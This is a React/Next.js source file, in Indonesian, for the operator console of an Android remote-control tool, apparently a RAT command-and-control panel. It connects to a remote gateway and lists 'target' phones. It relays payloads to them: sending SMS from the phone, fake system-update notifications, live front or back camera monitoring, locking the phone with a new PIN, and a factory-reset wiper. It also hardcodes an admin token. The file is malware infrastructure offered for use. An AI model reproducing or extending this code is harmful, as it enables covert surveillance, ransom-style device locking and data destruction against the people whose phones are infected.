"use client";

import { useState, useEffect, useRef } from "react";
import DashboardNav from "@/components/DashboardNav";
import ControlGrid from "@/components/ControlGrid";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { Input } from "@/components/ui/Input";
import { io, Socket } from "socket.io-client";
import { 
  Smartphone, Radio, Terminal, Cpu, Search, Activity, 
  X, Send, ShieldAlert, Sliders 
} from "lucide-react";
import { TargetDevice, NetworkLog } from "@/types";

const SOCKET_ENDPOINT = process.env.NEXT_PUBLIC_SOCKET_URL || "https://rayanxweb-gateway.onrender.com";

export default function DashboardConsole() {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [devices, setDevices] = useState<TargetDevice[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [search, setSearch] = useState("");
  const [logs, setLogs] = useState<NetworkLog[]>([]);
  const [latency, setLatency] = useState<number>(0);

  // State untuk Kontrol Modal Parameter Perintah
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [modalTitle, setModalTitle] = useState("");
  const [payloadParams, setPayloadParams] = useState<Record<string, any>>({});
  
  const logContainerRef = useRef<HTMLDivElement>(null);

  // Auto-scroll terminal log ke bawah setiap ada log baru
  useEffect(() => {
    if (logContainerRef.current) {
      logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    const s = io(SOCKET_ENDPOINT, { 
      transports: ["websocket"],
      reconnectionAttempts: 5,
      reconnectionDelay: 5000
    });

    s.on("connect", () => {
      s.emit("register_dashboard", { token: "ADMIN_SECURE_TOKEN_XYZ" });
      pushLog("INFO", "Koneksi pipa data WebSocket terenkripsi aktif.");
      
      // Loop interval pengukuran latensi (Ping)
      const pingInterval = setInterval(() => {
        const start = Date.now();
        s.emit("ping_check", () => {
          setLatency(Date.now() - start);
        });
      }, 4000);

      return () => clearInterval(pingInterval);
    });

    s.on("connect_error", () => {
      pushLog("WARN", "Gagal terhubung ke gateway server. Mencoba menyambung kembali...");
    });

    s.on("device_snapshot", (snapshot: TargetDevice[]) => {
      setDevices(snapshot);
      if (snapshot.length > 0 && !selectedId) setSelectedId(snapshot[0].deviceId);
    });

    s.on("device_online", (dev: TargetDevice) => {
      setDevices(prev => [...prev.filter(d => d.deviceId !== dev.deviceId), dev]);
      if (!selectedId) setSelectedId(dev.deviceId);
      pushLog("INFO", `Perangkat target masuk jaringan: ${dev.model} (${dev.deviceId.substring(0, 6)})`);
    });

    s.on("device_offline", (data: { deviceId: string }) => {
      setDevices(prev => prev.filter(d => d.deviceId !== data.deviceId));
      if (selectedId === data.deviceId) setSelectedId(null);
      pushLog("WARN", `Saluran pipa target terputus: ID ${data.deviceId.substring(0, 6)}`);
    });

    // Listener opsional jika client mengirim balik balasan eksekusi payload (callback log)
    s.on("execution_callback", (data: { deviceId: string; status: string; message: string }) => {
      pushLog("INFO", `[Callback ${data.deviceId.substring(0,4)}] ${data.message}`);
    });

    setSocket(s);
    return () => { s.disconnect(); };
  }, [selectedId]);

  const pushLog = (type: 'INFO' | 'CMD' | 'WARN', message: string) => {
    const freshLog: NetworkLog = {
      timestamp: new Date().toLocaleTimeString(),
      type,
      message
    };
    setLogs(prev => [...prev.slice(-49), freshLog]); // Menyimpan riwayat hingga 50 log terakhir
  };

  // Interseptor pemicu aksi grid kontrol
  const handleActionIntercept = (actionId: string) => {
    if (!selectedId) {
      alert("Kesalahan: Silakan pilih salah satu jalur pipa Android Client yang aktif terlebih dahulu.");
      return;
    }

    // Pemetaan fitur yang membutuhkan konfigurasi parameter tambahan sebelum dikirim
    switch (actionId) {
      case "notifikasi":
        openParamModal(actionId, "Kirim Payload Notifikasi", { title: "", message: "" });
        break;
      case "sms":
        openParamModal(actionId, "Kirim Pesan SMS Target", { phoneNumber: "", message: "" });
        break;
      case "wallpaper":
        openParamModal(actionId, "Injeksi Gambar Wallpaper", { imageUrl: "" });
        break;
      case "putar_video":
        openParamModal(actionId, "Streaming Video Payload", { videoUrl: "" });
        break;
      case "live_camera":
      case "cam_monitor":
        openParamModal(actionId, "Konfigurasi Kamera Monitor", { cameraFacing: "front" }); // front atau back
        break;
      case "reset_data":
      case "lock_pro":
        openParamModal(actionId, "⚠️ OTORISASI TINGKAT TINGGI", { confirmation: "", pin_lock: "814069" });
        break;
      default:
        // Untuk fitur instan tanpa parameter (contoh: Senter, Lacak, Kontak, dll) langsung eksekusi murni
        executeDirectPayload(actionId, {});
    }
  };

  const openParamModal = (actionId: string, title: string, defaultParams: Record<string, any>) => {
    setActiveModal(actionId);
    setModalTitle(title);
    setPayloadParams(defaultParams);
  };

  const executeDirectPayload = (actionId: string, params: Record<string, any>) => {
    if (!selectedId || !socket) return;

    socket.emit("relay_instruction", { 
      targetId: selectedId, 
      action: actionId,
      params: params
    });

    pushLog("CMD", `Instruksi [${actionId.toUpperCase()}] berhasil dialirkan ke target.`);
    setActiveModal(null);
  };

  const submitModalParams = (e: React.FormEvent) => {
    e.preventDefault();
    if (!activeModal) return;

    // Proteksi validasi konfirmasi khusus untuk perintah kritis reset data / penghancuran data
    if (activeModal === "reset_data" && payloadParams.confirmation !== "HANCURKAN") {
      alert("Batal: Anda harus mengetik kata 'HANCURKAN' secara tepat untuk memicu wiper data reset.");
      return;
    }

    executeDirectPayload(activeModal, payloadParams);
  };

  const filteredDevices = devices.filter(d => 
    d.model.toLowerCase().includes(search.toLowerCase()) || d.deviceId.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <main className="min-h-screen pb-32 pt-6 px-4 max-w-md mx-auto text-slate-300 relative select-none">
      
      {/* HEADER HUD STATISTIK JARINGAN */}
      <div className="grid grid-cols-4 gap-2 mb-4">
        {[
          { label: "NET PING", val: `${latency}ms`, icon: Activity, col: "text-cyan-400" },
          { label: "CONNECTED", val: devices.length, icon: Radio, col: "text-emerald-400" },
          { label: "SELECTED", val: selectedId ? selectedId.substring(0, 6).toUpperCase() : "-", icon: Cpu, col: "text-amber-400" },
          { label: "LOG SYSTEM", val: logs.length, icon: Terminal, col: "text-purple-400" }
        ].map((item, i) => (
          <div key={i} className="bg-panelDark rounded-2xl p-2.5 text-center shadow-neumorphicOut border border-slate-800/20">
            <div className="flex justify-center mb-1"><item.icon size={13} className={item.col} /></div>
            <p className="text-[7.5px] font-bold text-slate-500 uppercase tracking-widest">{item.label}</p>
            <p className="text-xs font-black text-white mt-0.5 truncate">{item.val}</p>
          </div>
        ))}
      </div>

      {/* REGISTRY SELEKTOR PIPELINE PERANGKAT CLIENT */}
      <Card className="p-4 mb-4">
        <div className="relative mb-3">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-600" size={13} />
          <input 
            type="text" 
            placeholder="Cari ID Perangkat / Model Target..." 
            value={search} 
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-bgDark text-[11px] rounded-xl p-2.5 pl-9 text-slate-300 outline-none shadow-neumorphicInset border border-transparent focus:border-neonCyan/10 transition-all placeholder:text-slate-600"
          />
        </div>
        <div className="flex gap-2 overflow-x-auto pb-1 scrollbar-thin">
          {filteredDevices.map(d => (
            <button 
              key={d.deviceId} 
              onClick={() => setSelectedId(d.deviceId)}
              className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[10px] font-mono shrink-0 transition-all duration-200 ${selectedId === d.deviceId ? 'bg-bgDark text-neonCyan shadow-neumorphicInset border border-neonCyan/20' : 'bg-bgDark/40 text-slate-500 hover:text-slate-400'}`}
            >
              <Smartphone size={10} />
              <span>{d.model} ({d.deviceId.substring(0,4)})</span>
            </button>
          ))}
          {filteredDevices.length === 0 && (
            <span className="text-[9px] text-slate-600 tracking-wider w-full text-center py-1 uppercase font-bold">
              Menunggu Inbound Tunnel Terhubung...
            </span>
          )}
        </div>
      </Card>

      {/* CORE GRID CONTROL FOR 17 PAYLOAD FEATURES */}
      <div className="mb-4">
        <ControlGrid onActionTrigger={handleActionIntercept} />
      </div>

      {/* TERMINAL BROADCAST INTERAKTIF */}
      <div className="bg-panelDark rounded-3xl p-4 shadow-neumorphicOut font-mono text-[9px] border border-slate-800/10">
        <p className="text-slate-500 font-bold border-b border-slate-800/60 pb-1.5 tracking-widest flex items-center gap-1.5 uppercase">
          <Terminal size={11} className="text-neonCyan" /> Jendela Aktivitas Aliran Data
        </p>
        <div 
          ref={logContainerRef}
          className="mt-2.5 space-y-1.5 max-h-[120px] overflow-y-auto scroll-smooth pr-1"
        >
          {logs.map((l, i) => (
            <div key={i} className="text-slate-400 flex items-start gap-1 leading-normal">
              <span className="text-slate-600 shrink-0">[{l.timestamp}]</span>
              <span className={`shrink-0 font-bold ${l.type === 'WARN' ? 'text-red-400' : l.type === 'CMD' ? 'text-neonCyan' : 'text-emerald-400'}`}>{l.type}</span>
              <span className="text-slate-300 break-all">- {l.message}</span>
            </div>
          ))}
          {logs.length === 0 && <div className="text-slate-600 italic">Belum ada aktivitas siaran data pada sesi ini.</div>}
        </div>
      </div>

      {/* NAVIGATION BAR BASE */}
      <DashboardNav />

      {/* MODAL CONFIGURATOR PARAMETER DINAMIS */}
      {activeModal && (
        <div className="fixed inset-0 bg-bgDark/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <Card className="w-full max-w-sm border border-slate-800/60 shadow-xl space-y-4 animate-in fade-in zoom-in-95 duration-150">
            <div className="flex justify-between items-center border-b border-slate-800 pb-2.5">
              <h3 className="text-xs font-black tracking-widest text-white uppercase flex items-center gap-2">
                <Sliders size={13} className="text-neonCyan" /> {modalTitle}
              </h3>
              <button 
                onClick={() => setActiveModal(null)}
                className="text-slate-500 hover:text-white transition-colors"
              >
                <X size={15} />
              </button>
            </div>

            <form onSubmit={submitModalParams} className="space-y-3.5 text-left">
              
              {/* Form Render Berdasarkan ID Perintah Aktif */}
              {activeModal === "notifikasi" && (
                <>
                  <div>
                    <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Judul Notifikasi Push</label>
                    <Input type="text" placeholder="Contoh: Pembaruan Sistem..." required
                      value={payloadParams.title || ""}
                      onChange={(e) => setPayloadParams({...payloadParams, title: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Isi Pesan Notifikasi</label>
                    <Input type="text" placeholder="Ketik pesan peringatan di sini..." required
                      value={payloadParams.message || ""}
                      onChange={(e) => setPayloadParams({...payloadParams, message: e.target.value})}
                    />
                  </div>
                </>
              )}

              {activeModal === "sms" && (
                <>
                  <div>
                    <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Nomor Handphone Penerima</label>
                    <Input type="tel" placeholder="Contoh: 0812XXXXXXXX" required
                      value={payloadParams.phoneNumber || ""}
                      onChange={(e) => setPayloadParams({...payloadParams, phoneNumber: e.target.value})}
                    />
                  </div>
                  <div>
                    <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Isi Pesan SMS Murni</label>
                    <Input type="text" placeholder="Ketik isi SMS outbound target..." required
                      value={payloadParams.message || ""}
                      onChange={(e) => setPayloadParams({...payloadParams, message: e.target.value})}
                    />
                  </div>
                </>
              )}

              {activeModal === "wallpaper" && (
                <div>
                  <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Direct URL Tautan Gambar (.jpg / .png)</label>
                  <Input type="url" placeholder="https://domain.com/gambar.jpg" required
                    value={payloadParams.imageUrl || ""}
                    onChange={(e) => setPayloadParams({...payloadParams, imageUrl: e.target.value})}
                  />
                </div>
              )}

              {activeModal === "putar_video" && (
                <div>
                  <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Direct URL Tautan Video Streaming (.mp4)</label>
                  <Input type="url" placeholder="https://domain.com/video.mp4" required
                    value={payloadParams.videoUrl || ""}
                    onChange={(e) => setPayloadParams({...payloadParams, videoUrl: e.target.value})}
                  />
                </div>
              )}

              {(activeModal === "live_camera" || activeModal === "cam_monitor") && (
                <div>
                  <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Pilih Sisi Lensa Perangkat</label>
                  <select 
                    value={payloadParams.cameraFacing || "front"}
                    onChange={(e) => setPayloadParams({...payloadParams, cameraFacing: e.target.value})}
                    className="w-full rounded-xl bg-bgDark p-3.5 text-xs text-slate-200 shadow-neumorphicInset outline-none border border-transparent appearance-none font-bold uppercase"
                  >
                    <option value="front" className="bg-panelDark">Lensa Kamera Depan</option>
                    <option value="back" className="bg-panelDark">Lensa Kamera Belakang</option>
                  </select>
                </div>
              )}

              {activeModal === "lock_pro" && (
                <div>
                  <label className="text-[8px] font-bold text-slate-500 uppercase tracking-wider">Konfigurasi Penguncian PIN Baru</label>
                  <Input type="number" placeholder="Default: 814069" required
                    value={payloadParams.pin_lock || ""}
                    onChange={(e) => setPayloadParams({...payloadParams, pin_lock: e.target.value})}
                  />
                </div>
              )}

              {activeModal === "reset_data" && (
                <div className="p-3 bg-red-950/20 border border-red-500/20 rounded-2xl space-y-3">
                  <p className="text-[9px] text-red-400 leading-normal flex items-start gap-1.5 font-bold">
                    <ShieldAlert size={16} className="shrink-0" /> TINDAKAN KRITIS: Seluruh partisi penyimpanan internal perangkat target akan dihapus total (Factory Reset).
                  </p>
                  <div>
                    <label className="text-[7.5px] font-bold text-red-400 uppercase tracking-wider block mb-1">Ketik kata &quot;HANCURKAN&quot; untuk validasi:</label>
                    <Input type="text" placeholder="Ketik kata konfirmasi..." required className="border-red-900/40 focus:border-red-500/40 text-red-400"
                      value={payloadParams.confirmation || ""}
                      onChange={(e) => setPayloadParams({...payloadParams, confirmation: e.target.value})}
                    />
                  </div>
                </div>
              )}

              {/* ACTION EXECUTE BUTTON */}
              <Button 
                type="submit" 
                variant="glow" 
                className={`w-full mt-2 flex items-center justify-center gap-2 ${activeModal === 'reset_data' ? 'border-red-500/20 text-red-400 shadow-none hover:bg-red-950/20' : ''}`}
              >
                <Send size={11} /> Salurkan Paket Instruksi
              </Button>
            </form>
          </Card>
        </div>
      )}
    </main>
  );
}
